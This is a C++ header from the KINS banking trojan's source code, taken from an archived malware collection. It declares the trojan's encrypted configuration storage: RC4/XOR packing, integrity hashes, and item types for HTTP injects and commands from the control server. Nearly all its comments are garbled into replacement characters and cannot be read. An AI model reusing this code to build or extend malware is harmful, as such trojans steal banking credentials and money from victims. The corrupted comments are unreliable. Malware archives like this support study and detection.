/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������ � �������� ����������.

  ����������: ���������� ID ����� ���� wID1 == wID2 � ITEMF_IS_* == ITEMF_IS_*.
*/
#pragma once

#include "crypt.h"

#define BINSTORAGE_MAX_SIZE (10 * 1024 * 1024) //WININET_MAXBYTES_TO_MEM

namespace BinStorage
{
  //����� ��� ITEM.
  enum
  {
    ITEMF_COMPRESSED        = 0x00000001, //������ �����.
    
    //������ ����� ������ ��� �������� ������ ����������.
    ITEMF_COMBINE_ADD       = 0x00010000, //����� ����������, ���� ����� ���������, ������ �� ����������.
    ITEMF_COMBINE_OVERWRITE = 0x00020000, //����� ����������, ���� ����� �� ���������, ��������� ����� ������.
    ITEMF_COMBINE_REPLACE   = 0x00040000, //����� ������,���� ����� �� ���������, ������ �� ����������.
    ITEMF_COMBINE_DELETE    = 0x00080000, //����� �������� ����������� �������� � ��������.
    ITEMF_COMBINE_MASK      = ITEMF_COMBINE_ADD | ITEMF_COMBINE_OVERWRITE | ITEMF_COMBINE_REPLACE | ITEMF_COMBINE_DELETE,

	ITEMF_IS_ARGUMENT		= 0x00100000,
	ITEMF_IS_MODULE_HASH    = 0x00200000,
	ITEMF_IS_PROC_NAME_HASH = 0x00400000,

    //������ ����� ������� ��� ���������� ����� ���������� dwID.
    ITEMF_IS_OPTION         = 0x10000000, //������� ������� ������.
    ITEMF_IS_SETTING        = 0x20000000, //������� �������� ����������.
    ITEMF_IS_HTTP_INJECT    = 0x40000000, //������� ������� http-��������.
	ITEMF_IS_COMMAND        = 0x80000000, //Command from server.
    ITEMF_IS_MASK           = ITEMF_IS_OPTION | ITEMF_IS_SETTING | ITEMF_IS_HTTP_INJECT
  };

  #pragma pack(push, 1)
  //���������.
  typedef struct
  {
    BYTE randData[20];                //����������� ������.
    DWORD size;                       //������ ������ ���������.
    DWORD flags;                      //�����.
    DWORD count;                      //���������� �����.
    BYTE md5Hash[16/*MD5HASH_SIZE*/]; //MD5 ��� �� p + sizeof(CONFIGHEADER) �� p + dwSize.
  }STORAGE;
  
  //�������.
  typedef struct
  {
    DWORD id;       //ID �����, ������ CRC32.
    DWORD flags;    //�����.
    DWORD size;     //������ ������ ������ ���� ���������� ���� ITEMF_COMPRESSED. ����� ����� realSize.
    DWORD realSize; //�������� ������ ������.
  }ITEM;
  #pragma pack(pop)

  //����� ��� _openStorageFile().
  enum
  {
    OSF_WRITE_ACCESS = 0x1 //������� ����������� ���� ��� ������, ��� ������� ����� � ������
                           //�������� �����.
  };
  
  //������ � ���������.
  typedef struct
  {
    HANDLE file;     //OUT ����� �����.
    DWORD64 curItem; //OUT ������� �������� ��������.
    DWORD xorKey;    //IN XOR ����� ����������.
  }STORAGEARRAY;
  
  //����� ��� _Pack.
  enum
  {
    PACKF_FINAL_MODE = 0x1 //����� �����������, ������������ ��� ������ �������� ������������,
                           //��������� ����� ITEMF_COMBINE_*.
  };
  
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ��� ���������.

    IN binStorage - ���������

    Return - true - � ������ ���������� ����,
             false - � ������ ������.
  */
  bool _checkHash(STORAGE *binStorage);
  
  /*
    �������� ������� ���������.

    Return - ��������� (������ ���� ������ ����� Mem),
             ��� NULL � ������ ������.
  */
  STORAGE *_createEmpty(void);
  
  /*
    ���������� �������� � ���������.

    IN OUT binStorage - ���������.
    IN id             - ID ����� �����.
    IN flags          - ����� ITEMF_*.
    IN data           - ������ �����.
    IN dataSize       - ������ ������.

    Return            - true, � ������ ��������� ����������,
                        false, � ������ ������. 
    
    ����������: ������� ����� �� ���������� �� �����������.
  */
  bool _addItem(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize);
  
  /*
    ���������� Unicode-������ � ��������� ��� UTF-8 ������.

    IN OUT binStorage - ���������.
    IN id             - ID ����� �����.
    IN flags          - ����� ITEMF_*.
    IN string         - ������ ��� ����������.

    Return            - true, � ������ ��������� ����������,
                        false, � ������ ������.     
  */
  bool _addItemAsUtf8StringW(STORAGE **binStorage, DWORD id, DWORD flags, LPWSTR string);
  
  /*
    ���������� ANSI-������ � ��������� ��� UTF-8 ������.

    IN OUT binStorage - ���������.
    IN id             - ID ������ ��������.
    IN flags          - ����� ITEMF_*.
    IN string         - ������ ��� ����������.

    Return            - true, � ������ ��������� ����������,
                        false, � ������ ������.     
  */
  bool _addItemAsUtf8StringA(STORAGE **binStorage, DWORD id, DWORD flags, LPSTR string);

  /*
    ����������� ��������.

    IN OUT binStorage - ���������.
    IN item           - ������� ��� ����������� (����� ����������� ������� ����� ����� ���� ��
                        �����������).
    IN flags          - ����� ITEMF_*.
    IN data           - ������ �����.
    IN dataSize       - ������ ������.

    Return            - true, � ������ ��������� ����������,
                        false, � ������ ������. 
  */
  bool _modifyItem(STORAGE **binStorage, ITEM *item, DWORD flags, void *data, DWORD dataSize);
  
  /*
    ����������� ��������.

    IN OUT binStorage - ���������.
    IN id             - ������� ��� �����������.
    IN flags          - ����� ITEMF_*.
    IN data           - ������ �����.
    IN dataSize       - ������ ������.

    Return            - true, � ������ ��������� ����������,
                        false, � ������ ������. 
  */
  bool _modifyItemById(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize);
  
  /*
    ��������� ���������� �������� �� ���������.

    IN binStorage - ���������.
    IN curItem    - ������� �������, ��� NULL ��� ��������� ������� ��������.

    Return        - ��������� ������� ������������ curItem, ��� NULL ���� ��������� ������ �� �������.
  */
  ITEM *_getNextItem(const STORAGE *binStorage, ITEM *curItem);

  /*
    ��������� �������� �� ���������.

    IN binStorage - ���������.
    IN id         - ID ��������.
    IN isFlag     - ���� �� ������ ITEMF_IS_* ��� ����������� ���� ��������.

    Return        - �������� �������, ��� NULL ���� ������� �� ������.
  */
  ITEM *_getItem(const STORAGE *binStorage, DWORD id, DWORD isFlag);
  
  /*
    ��������� ����������� �������� �� ���������.

    IN pi  - ��������.

    Return - ������ ��������(������ ���� ����������� ����� Mem), ��� NULL ���� ������ ���.

    ����������: ��� ���������� ������ � ����� ������ ����������� �������������� ������� WCHAR-������,
                ��� ��������� ��������� �������� �� ��������.
  */
  void *_getItemData(const ITEM *item);

  /*
    ��������� ����������� �������� �� ���������. �������� ��� _GetItem � _GetItemData.

    IN binStorage - ���������.
    IN id         - ID ��������.
    IN isFlag     - ���� �� ������ ITEMF_IS_* ��� ����������� ���� ��������.
    OUT size      - ������ ������. ����� ���� NULL.

    Return        - ������ ��������(������ ���� ����������� ����� Mem), ��� NULL ���� ������ ���.
  */
  void *_getItemDataEx(const STORAGE *binStorage, DWORD id, DWORD isFlag, LPDWORD size);

  /*
    ��������� ����������� �������� �� ��������� ��� DWORD.

    IN binStorage - ���������.
    IN id         - ID ��������.
    IN isFlag     - ���� �� ������ ITEMF_IS_* ��� ����������� ���� ��������.
    OUT data      - ������. ����� ���� NULL, ���� �������� �� �����.

    Return        - true - � ������ ������,
                    false - � ������ ������.
  */
  bool _getItemDataAsDword(const STORAGE *binStorage, DWORD id, DWORD isFlag, LPDWORD data);
  
  /*
    �������� ���������.

    IN OUT binStorage - �� ����� ��������� ��� ���������, �� ������ ����������� ���������,
                        ������� ��� �� �������� ��� �������������. ��� ���������� �������������
                        ����� �������� _unpack().
    IN flags          - ����� �����������, ������������ ��� ������ ��������� ���������, ���������
                        ����� PACKF_*.
    IN rc4Key         - ���� ���������� ��� NULL ���� ���������� �� �����. ���� �� ����������.

    Return            - ������ ���������, ��� 0 � ������ ������.
  */
  DWORD _pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key);

  /*
    ���������� ������������.

    OUT binStorage - ���������. ������ ���� ����������� ����� Mem. ���� binStorage == NULL, ��
                     ���������� ���������� ������ data.
    IN OUT data    - ������ ������� �������� ���������� ����������. ���� binStorage == NULL, ��
                     ���������� ���������� ������ data.
    IN dataSize    - ������ data.
    IN rc4Key      - ���� ���������� ��� NULL ���� ���������� �� �����.

    Return         - ������ ���������, ��� 0 � ������ ������, ����� *binStorage ����� ����� NULL.
  */
  DWORD _unpack(STORAGE **binStorage, void *data, DWORD dataSize, Crypt::RC4KEY *rc4Key);

  /*
    ���������� ��������� �� �����.

    OUT binStorage - ���������. ������ ���� ����������� ����� Mem.
    IN fileName    - ���� ���������.
    IN rc4Key      - ���� ���������� ��� NULL ���� ���������� �� �����.

    Return          - ������ ���������, ��� 0 � ������ ������, ����� *binStorage ����� ����� NULL.
  */
  DWORD _unpackFromFile(STORAGE **binStorage, LPWSTR fileName, Crypt::RC4KEY *rc4Key);
  
  /*
    ���������� ��� ��������� � ���� �����. ������� ��������� ������ ���� �����������.

    IN binStorage1 - ������ ���������.
    IN binStorage2 - ������ ���������.

    Return         - ����� ���������, ��� NULL � ������ ������.
  */
  STORAGE *_combine(STORAGE *binStorage1, STORAGE *binStorage2);

  /*
    ��������/�������� ����� �������. ��� �������� �����, ����������� ��� ������������,
    � �� ����������� ����������� ������ (��� ���� ����� ������ ����� ���� �������).

    IN fileName         - ��� �����.
    IN flags            - ����� OSF_.
    IN OUT storageArray - ������ �� �������. �� ����� ������ ���� ���������� ��� � ��������.

    Return              - true - � ������ ��������� �������� �����,
                          false - � ������ ������ �������� ��� ����������� ������ � �����(
                          storage->file ����� ����� INVALID_HANDLE_VALUE).

    ����������: � ������ �������� false: flags & OSF_WRITE_ACCESS �
                GetLastError() != ERROR_ACCESS_DEFINED ������������ ������� ����, � ��������� ������
                ����������� ��������� ������ ������ ���� ����� OSF_WRITE_ACCESS.
  */
  bool _openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *storageArray);
  
  /*
    ��������� ������.
    
    IN OUT storageArray - ������.

    ����������: �� ������ storageArray->file ����� ����� INVALID_HANDLE_VALUE.
  */
  void _closeStorageArray(STORAGEARRAY *storageArray);
  
  /*
    ���������� ��������� � ����� �������.

    IN storageArray - ������.
    IN binStorage   - ������������� ���������.
    IN size         - ������ ���������.

    Return          - true - � ������ ������,
                      false - � ������ ������.
  */
  bool _addToStorageArray(STORAGEARRAY *storageArray, STORAGE *binStorage, DWORD size);
  
  /*
    ���������� ��������� ������� ����������� ��������� �� �������.
    
    IN storageArray - ������.
  */
  void _resetStorageArrayPointer(STORAGEARRAY *storageArray);
  
  /*
    �������� ��������� ��������� � �������. ������� �������� _unpack ��� �������� �
    ��������������� ���������.

    IN storageArray - ������.
    OUT binStorage  - ���������. ������ ���� ����������� ����� Mem.
    OUT size        - ������ ���������.
    IN rc4Key       - ���� ���������� ��� NULL.

    Return          - true - � ������ ������, ���� *size - �� ��������� ����� �����,
                      false - � ������ ������.
  */
  bool _getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **binStorage, LPDWORD size, Crypt::RC4KEY *rc4Key);
  
  /*
    ������� �������� ��������� �� �������.
    
    IN storageArray - ������.
    
    Return          - true - � ������ ������,
                      false - � ������ ������.
  */
  bool _removeCurrentFromStorageArray(STORAGEARRAY *storageArray);
};
